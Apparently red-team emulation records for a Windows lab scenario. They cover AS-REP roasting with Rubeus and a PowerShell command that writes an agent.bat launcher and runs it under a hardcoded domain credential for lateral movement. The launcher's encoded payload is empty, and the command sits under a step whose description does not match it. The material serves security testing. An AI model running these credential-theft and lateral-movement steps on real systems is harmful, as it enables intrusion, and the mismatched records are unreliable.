ability_metadata.ability_name: LMT_SC2_V-1_STP-2_Creating the folder and Download tools
ability_metadata.ability_description: As SArah will jump to C:\Sarah Adams\Desktop and create a folder called tools and download rubeus there
Running RUbeus and extracting hash of twilight user

attack_metadata.technique_name: Steal or Forge Kerberos Tickets: AS-REP Roasting

command: cd "C:\Scripts";$scriptContent = 'powershell -e ';$scriptContent | Out-File -FilePath "C:\Scripts\agent.bat" -Encoding ASCII;$username = 'it\twilight';$password = 'Admin@pass';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;Start-Process "C:\Scripts\agent.bat" -Credential $credential
plaintext_command: cd "C:\Scripts";$scriptContent = 'powershell -e ';$scriptContent | Out-File -FilePath "C:\Scripts\agent.bat" -Encoding ASCII;$username = 'it\twilight';$password = 'Admin@pass';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;Start-Process "C:\Scripts\agent.bat" -Credential $credential

ability_metadata.ability_name: LMT_SC2_V-1_STP-4_Connection as another user lateral movment
ability_metadata.ability_description: Get a connection as Twilight by making a payload agent.bat and run the script as the twilight creds after cracking the hash of the user
